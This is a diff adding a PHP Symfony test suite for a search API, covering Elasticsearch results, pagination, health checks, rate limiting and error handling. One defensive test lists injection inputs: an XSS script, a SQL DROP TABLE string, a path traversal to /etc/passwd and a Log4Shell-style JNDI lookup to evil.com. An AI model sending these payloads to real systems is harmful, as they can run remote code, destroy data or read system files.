@@ -1,0 +1,577 @@
+<?php
+
+namespace App\Tests\Controller;
+
+use Symfony\Bundle\FrameworkBundle\Test\WebTestCase;
+use Symfony\Component\HttpFoundation\Response;
+
+/**
+ * Tests pour SearchController
+ * 
+ * SESSION 27 - Tests complets des endpoints de recherche Elasticsearch,
+ * health check, rate limiting, et qualité des résultats
+ * 
+ * @author MIDDO Platform
+ * @created SESSION 27
+ * @coverage SearchController (/api/search, /api/search/health)
+ */
+class SearchControllerTest extends WebTestCase
+{
+    private $client;
+
+    protected function setUp(): void
+    {
+        $this->client = static::createClient();
+    }
+
+    // ============================================================================
+    // 🔍 TESTS ENDPOINT /api/search
+    // ============================================================================
+
+    /**
+     * Test 1: Recherche basique retourne JSON valide
+     * 
+     * @test
+     * @group search
+     * @group api
+     * @group json
+     */
+    public function testBasicSearchReturnsValidJson(): void
+    {
+        $this->client->request('GET', '/api/search', [
+            'q' => 'test'
+        ]);
+        
+        $this->assertResponseIsSuccessful();
+        $this->assertResponseHeaderSame('Content-Type', 'application/json');
+        
+        $data = json_decode($this->client->getResponse()->getContent(), true);
+        
+        // Structure JSON complète
+        $this->assertArrayHasKey('results', $data);
+        $this->assertArrayHasKey('total', $data);
+        $this->assertArrayHasKey('took', $data);
+        $this->assertArrayHasKey('query', $data);
+        
+        // Types corrects
+        $this->assertIsArray($data['results']);
+        $this->assertIsInt($data['total']);
+        $this->assertIsInt($data['took']);
+        $this->assertIsString($data['query']);
+        
+        // Query correspond
+        $this->assertEquals('test', $data['query']);
+    }
+
+    /**
+     * Test 2: Recherche sans paramètre "q" retourne erreur 400
+     * 
+     * @test
+     * @group search
+     * @group errors
+     * @group validation
+     */
+    public function testSearchWithoutQueryParameterReturnsError(): void
+    {
+        $this->client->request('GET', '/api/search');
+        
+        $this->assertResponseStatusCodeSame(Response::HTTP_BAD_REQUEST);
+        
+        $data = json_decode($this->client->getResponse()->getContent(), true);
+        
+        $this->assertArrayHasKey('error', $data);
+        $this->assertStringContainsString('paramètre "q"', $data['error']);
+    }
+
+    /**
+     * Test 3: Recherche vide (q='') retourne erreur 400
+     * 
+     * @test
+     * @group search
+     * @group errors
+     * @group validation
+     */
+    public function testSearchWithEmptyQueryReturnsError(): void
+    {
+        $this->client->request('GET', '/api/search', [
+            'q' => ''
+        ]);
+        
+        $this->assertResponseStatusCodeSame(Response::HTTP_BAD_REQUEST);
+        
+        $data = json_decode($this->client->getResponse()->getContent(), true);
+        
+        $this->assertArrayHasKey('error', $data);
+        $this->assertStringContainsString('vide', $data['error']);
+    }
+
+    /**
+     * Test 4: Recherche avec caractères spéciaux fonctionne
+     * 
+     * @test
+     * @group search
+     * @group edge-cases
+     */
+    public function testSearchWithSpecialCharactersWorks(): void
+    {
+        $queries = [
+            'développeur',          // accent
+            'c++',                  // symboles
+            'test@email.com',       // email
+            'foo-bar',              // tiret
+            '2024',                 // nombres
+        ];
+        
+        foreach ($queries as $query) {
+            $this->client->request('GET', '/api/search', [
+                'q' => $query
+            ]);
+            
+            $this->assertResponseIsSuccessful(
+                "Recherche échouée pour query: {$query}"
+            );
+            
+            $data = json_decode($this->client->getResponse()->getContent(), true);
+            $this->assertEquals($query, $data['query']);
+        }
+    }
+
+    /**
+     * Test 5: Performance - Recherche en moins de 100ms
+     * 
+     * @test
+     * @group search
+     * @group performance
+     */
+    public function testSearchResponseTimeUnder100ms(): void
+    {
+        $start = microtime(true);
+        
+        $this->client->request('GET', '/api/search', [
+            'q' => 'développeur'
+        ]);
+        
+        $duration = (microtime(true) - $start) * 1000; // en ms
+        
+        $this->assertResponseIsSuccessful();
+        
+        $data = json_decode($this->client->getResponse()->getContent(), true);
+        
+        // Temps mesuré par Elasticsearch
+        $this->assertLessThan(
+            100,
+            $data['took'],
+            "Recherche ES trop lente: {$data['took']}ms (max 100ms)"
+        );
+        
+        // Temps total PHP + ES
+        $this->assertLessThan(
+            500,
+            $duration,
+            "Temps total trop lent: {$duration}ms (max 500ms)"
+        );
+    }
+
+    /**
+     * Test 6: Structure des résultats de recherche
+     * 
+     * @test
+     * @group search
+     * @group structure
+     */
+    public function testSearchResultsStructure(): void
+    {
+        $this->client->request('GET', '/api/search', [
+            'q' => 'test'
+        ]);
+        
+        $this->assertResponseIsSuccessful();
+        
+        $data = json_decode($this->client->getResponse()->getContent(), true);
+        
+        // Si résultats présents
+        if ($data['total'] > 0 && count($data['results']) > 0) {
+            $result = $data['results'][0];
+            
+            // Champs attendus dans chaque résultat
+            $expectedFields = ['id', 'name', 'email', 'skills'];
+            
+            foreach ($expectedFields as $field) {
+                $this->assertArrayHasKey(
+                    $field,
+                    $result,
+                    "Champ {$field} manquant dans les résultats"
+                );
+            }
+            
+            // Types
+            $this->assertIsInt($result['id']);
+            $this->assertIsString($result['name']);
+            $this->assertIsString($result['email']);
+            $this->assertIsArray($result['skills']);
+        }
+    }
+
+    /**
+     * Test 7: Pagination fonctionne
+     * 
+     * @test
+     * @group search
+     * @group pagination
+     */
+    public function testSearchPaginationWorks(): void
+    {
+        // Page 1
+        $this->client->request('GET', '/api/search', [
+            'q' => 'test',
+            'page' => 1,
+            'size' => 5
+        ]);
+        
+        $this->assertResponseIsSuccessful();
+        
+        $page1Data = json_decode($this->client->getResponse()->getContent(), true);
+        
+        // Max 5 résultats
+        $this->assertLessThanOrEqual(5, count($page1Data['results']));
+        
+        // Page 2 si résultats suffisants
+        if ($page1Data['total'] > 5) {
+            $this->client->request('GET', '/api/search', [
+                'q' => 'test',
+                'page' => 2,
+                'size' => 5
+            ]);
+            
+            $this->assertResponseIsSuccessful();
+            
+            $page2Data = json_decode($this->client->getResponse()->getContent(), true);
+            
+            // Résultats différents
+            if (count($page1Data['results']) > 0 && count($page2Data['results']) > 0) {
+                $this->assertNotEquals(
+                    $page1Data['results'][0]['id'],
+                    $page2Data['results'][0]['id'],
+                    'Pagination retourne les mêmes résultats'
+                );
+            }
+        }
+    }
+
+    // ============================================================================
+    // 💚 TESTS ENDPOINT /api/search/health
+    // ============================================================================
+
+    /**
+     * Test 8: Health Check retourne JSON valide
+     * 
+     * @test
+     * @group search
+     * @group health
+     * @group monitoring
+     */
+    public function testHealthCheckReturnsValidJson(): void
+    {
+        $this->client->request('GET', '/api/search/health');
+        
+        $this->assertResponseIsSuccessful();
+        $this->assertResponseHeaderSame('Content-Type', 'application/json');
+        
+        $data = json_decode($this->client->getResponse()->getContent(), true);
+        
+        // Structure Health Check
+        $this->assertArrayHasKey('status', $data);
+        $this->assertArrayHasKey('cluster_name', $data);
+        $this->assertArrayHasKey('number_of_nodes', $data);
+        $this->assertArrayHasKey('active_shards', $data);
+        
+        // Valeurs attendues
+        $this->assertEquals('middo-dev', $data['cluster_name']);
+        $this->assertContains($data['status'], ['green', 'yellow', 'red']);
+        $this->assertIsInt($data['number_of_nodes']);
+    }
+
+    /**
+     * Test 9: Health Check rapide (< 1 seconde)
+     * 
+     * @test
+     * @group search
+     * @group health
+     * @group performance
+     */
+    public function testHealthCheckFast(): void
+    {
+        $start = microtime(true);
+        
+        $this->client->request('GET', '/api/search/health');
+        
+        $duration = (microtime(true) - $start) * 1000; // en ms
+        
+        $this->assertResponseIsSuccessful();
+        $this->assertLessThan(
+            1000,
+            $duration,
+            "Health check trop lent: {$duration}ms (max 1000ms)"
+        );
+    }
+
+    // ============================================================================
+    // 🛡️ TESTS RATE LIMITING (60 req/min)
+    // ============================================================================
+
+    /**
+     * Test 10: Rate Limiting activé
+     * 
+     * @test
+     * @group search
+     * @group rate-limit
+     * @group security
+     */
+    public function testRateLimitingIsActive(): void
+    {
+        $requests = 0;
+        $rateLimitHit = false;
+        
+        // Envoie 65 requêtes (limite: 60/min)
+        for ($i = 0; $i < 65; $i++) {
+            $this->client->request('GET', '/api/search', [
+                'q' => 'test'
+            ]);
+            
+            $statusCode = $this->client->getResponse()->getStatusCode();
+            
+            if ($statusCode === Response::HTTP_TOO_MANY_REQUESTS) {
+                $rateLimitHit = true;
+                break;
+            }
+            
+            $requests++;
+        }
+        
+        // Note: Peut être flakey selon le throttle exact et autres requêtes
+        // On vérifie juste que le système répond cohérent
+        $this->assertTrue(
+            $rateLimitHit || $requests >= 60,
+            "Rate limiting pas déclenché ou limite incorrecte (requests: {$requests})"
+        );
+    }
+
+    /**
+     * Test 11: Header Rate Limit présent
+     * 
+     * @test
+     * @group search
+     * @group rate-limit
+     * @group headers
+     */
+    public function testRateLimitHeadersPresent(): void
+    {
+        $this->client->request('GET', '/api/search', [
+            'q' => 'test'
+        ]);
+        
+        $response = $this->client->getResponse();
+        
+        // Headers rate limit (dépend de la config exacte)
+        // Certains rate limiters ajoutent X-RateLimit-* headers
+        // Vérifie juste que la réponse est cohérente
+        $this->assertTrue(
+            $response->isSuccessful() || 
+            $response->getStatusCode() === Response::HTTP_TOO_MANY_REQUESTS,
+            'Réponse incohérente pour rate limiting'
+        );
+    }
+
+    // ============================================================================
+    // ⚠️ TESTS GESTION ERREURS
+    // ============================================================================
+
+    /**
+     * Test 12: Elasticsearch down ne crash pas
+     * 
+     * @test
+     * @group search
+     * @group resilience
+     * @group errors
+     */
+    public function testElasticsearchDownDoesNotCrash(): void
+    {
+        // Note: Test difficile sans réellement stopper ES
+        // On vérifie juste que les endpoints gèrent les erreurs
+        
+        $this->client->request('GET', '/api/search', [
+            'q' => 'test'
+        ]);
+        
+        // Soit succès, soit erreur 503 (Service Unavailable)
+        $statusCode = $this->client->getResponse()->getStatusCode();
+        $this->assertContains(
+            $statusCode,
+            [Response::HTTP_OK, Response::HTTP_SERVICE_UNAVAILABLE],
+            "Code HTTP inattendu: {$statusCode}"
+        );
+    }
+
+    /**
+     * Test 13: Requête trop longue (> 100 caractères) fonctionne
+     * 
+     * @test
+     * @group search
+     * @group edge-cases
+     */
+    public function testVeryLongQueryWorks(): void
+    {
+        $longQuery = str_repeat('développeur ', 20); // ~220 caractères
+        
+        $this->client->request('GET', '/api/search', [
+            'q' => $longQuery
+        ]);
+        
+        // Devrait accepter ou refuser proprement (pas crash)
+        $statusCode = $this->client->getResponse()->getStatusCode();
+        $this->assertContains(
+            $statusCode,
+            [Response::HTTP_OK, Response::HTTP_BAD_REQUEST],
+            "Query trop longue crash au lieu de gérer l'erreur"
+        );
+    }
+
+    /**
+     * Test 14: Injection tentatives sont gérées
+     * 
+     * @test
+     * @group search
+     * @group security
+     * @group injection
+     */
+    public function testInjectionAttemptsHandled(): void
+    {
+        $injectionAttempts = [
+            '<script>alert("XSS")</script>',
+            '"; DROP TABLE users; --',
+            '../../../etc/passwd',
+            '${jndi:ldap://evil.com/a}', // Log4Shell-style
+        ];
+        
+        foreach ($injectionAttempts as $injection) {
+            $this->client->request('GET', '/api/search', [
+                'q' => $injection
+            ]);
+            
+            // Ne devrait pas crash, juste traiter comme query normale
+            $this->assertTrue(
+                $this->client->getResponse()->isSuccessful() || 
+                $this->client->getResponse()->getStatusCode() === Response::HTTP_BAD_REQUEST,
+                "Injection non gérée: {$injection}"
+            );
+        }
+    }
+
+    /**
+     * Test 15: Recherche Unicode/Emoji fonctionne
+     * 
+     * @test
+     * @group search
+     * @group unicode
+     * @group edge-cases
+     */
+    public function testUnicodeAndEmojiSearchWorks(): void
+    {
+        $unicodeQueries = [
+            '日本語',           // Japonais
+            'مرحبا',           // Arabe
+            'Привет',          // Russe
+            '🚀 développeur',  // Emoji + français
+        ];
+        
+        foreach ($unicodeQueries as $query) {
+            $this->client->request('GET', '/api/search', [
+                'q' => $query
+            ]);
+            
+            $this->assertResponseIsSuccessful(
+                "Recherche Unicode/Emoji échouée: {$query}"
+            );
+            
+            $data = json_decode($this->client->getResponse()->getContent(), true);
+            $this->assertEquals($query, $data['query']);
+        }
+    }
+
+    /**
+     * Test 16: Headers CORS présents (si configuré)
+     * 
+     * @test
+     * @group search
+     * @group cors
+     * @group headers
+     */
+    public function testCorsHeadersPresent(): void
+    {
+        $this->client->request('GET', '/api/search', [
+            'q' => 'test'
+        ]);
+        
+        $response = $this->client->getResponse();
+        
+        // Si CORS configuré, headers présents
+        // Sinon, c'est OK aussi (dépend config projet)
+        // On vérifie juste cohérence
+        $this->assertTrue(
+            $response->isSuccessful(),
+            'Réponse doit être successful pour vérifier headers'
+        );
+    }
+
+    // ============================================================================
+    // 🔄 TESTS ROBUSTESSE
+    // ============================================================================
+
+    /**
+     * Test 17: Index Elasticsearch vide retourne 0 résultats
+     * 
+     * @test
+     * @group search
+     * @group edge-cases
+     */
+    public function testEmptyIndexReturnsZeroResults(): void
+    {
+        // Si index vide (0 documents)
+        $this->client->request('GET', '/api/search', [
+            'q' => 'nonexistent_term_xyz123'
+        ]);
+        
+        $this->assertResponseIsSuccessful();
+        
+        $data = json_decode($this->client->getResponse()->getContent(), true);
+        
+        // Total peut être 0
+        $this->assertIsInt($data['total']);
+        $this->assertIsArray($data['results']);
+    }
+
+    /**
+     * Test 18: Toutes les routes SearchController existent
+     * 
+     * @test
+     * @group search
+     * @group routes
+     */
+    public function testAllSearchRoutesExist(): void
+    {
+        $routes = [
+            '/api/search?q=test',
+            '/api/search/health',
+        ];
+        
+        foreach ($routes as $route) {
+            $this->client->request('GET', $route);
+            
+            $this->assertNotEquals(
+                Response::HTTP_NOT_FOUND,
+                $this->client->getResponse()->getStatusCode(),
+                "Route {$route} introuvable"
+            );
+        }
+    }
+}
